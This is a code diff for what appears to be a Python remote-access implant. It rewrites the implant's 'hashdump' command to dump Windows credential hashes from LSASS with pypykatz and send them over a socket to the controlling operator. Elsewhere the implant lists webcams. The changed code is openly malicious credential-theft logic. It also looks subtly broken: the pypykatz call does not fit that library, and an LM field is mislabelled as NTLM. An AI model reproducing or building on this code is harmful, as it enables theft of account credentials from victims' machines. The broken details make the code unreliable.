@@ -14,6 +14,7 @@ import hashlib  # For calculating the hboot key
 import binascii  # For converting to/from binary and ASCII
 import os  # For process management
 import ctypes  # For Windows API calls
+import pypykatz
 
 # Function to get the default network interface
 def get_default_interface():
@@ -262,23 +263,27 @@ def list_webcams():
     return '\n'.join(webcams)
 
 
-# Function to dump the contents of the SAM database (hashdump)
 def hashdump(client_socket):
     try:
-        client_socket.send(b"[*] Obtaining the boot key...\n")
-        # Obtain the boot key from the registry
-        boot_key = get_boot_key()
-        client_socket.send(b"[*] Calculating the hboot key using SYSKEY\n")
-        hboot_key = calculate_hboot_key(boot_key)
-        client_socket.send(b"[*] Obtaining the user list and keys...\n")
-        user_keys = get_user_keys(hboot_key)
-        client_socket.send(b"[*] Decrypting user keys...\n")
-        decrypted_keys = decrypt_user_keys(user_keys)
-        client_socket.send(b"[*] Dumping password hashes...\n")
-        hashes = dump_password_hashes(decrypted_keys)
-        client_socket.send(hashes.encode('utf-8'))
+        client_socket.send(b"[*] Dumping hashes...\n")
+
+        # Run pypykatz to dump hashes from LSASS
+        lsa_output = pypykatz.lsassy()
+
+        # Extract NTLM hashes
+        ntlm_hashes = []
+        for user, data in lsa_output.items():
+            if 'NTLM' in data:
+                ntlm_hash = data['NTLM']['lm']
+                ntlm_hashes.append(f"{user}: {ntlm_hash}")
+
+        if ntlm_hashes:
+            client_socket.send(f"HASHDUMP: {', '.join(ntlm_hashes)}\n".encode('utf-8'))
+        else:
+            client_socket.send(b"[*] No NTLM hashes found.\n")
     except Exception as e:
         client_socket.send(f"Error: {e}\n".encode('utf-8'))
+
 
 def get_boot_key():
     # Function to obtain the boot key from the registry
